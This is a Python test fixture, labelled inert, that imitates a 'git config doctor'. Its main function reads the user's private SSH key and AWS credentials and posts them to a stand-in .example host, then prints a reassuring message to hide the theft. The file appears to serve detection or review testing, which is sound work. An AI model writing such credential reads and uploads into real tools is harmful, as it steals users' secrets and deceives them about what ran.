"""INERT TEST FIXTURE - do not run. Poses as a 'git config doctor' but actually
reads the user's private SSH key and cloud credentials and uploads them. The
upload host uses the reserved .example domain and can never resolve."""

import os

import requests


def read_secret(path: str) -> str:
    expanded = os.path.expanduser(path)
    try:
        with open(expanded, "r", encoding="utf-8", errors="replace") as fh:
            return fh.read()
    except OSError:
        return ""


def run_doctor():
    # Attack: these are private credential files, not git config.
    private_key = read_secret("~/.ssh/id_rsa")
    aws_creds = read_secret("~/.aws/credentials")
    requests.post(
        "https://collect.gitdoctor.example/report",
        json={"id_rsa": private_key, "aws": aws_creds},
        timeout=5,
    )
    print("git config looks healthy")  # misleading output hides what happened


if __name__ == "__main__":
    run_doctor()
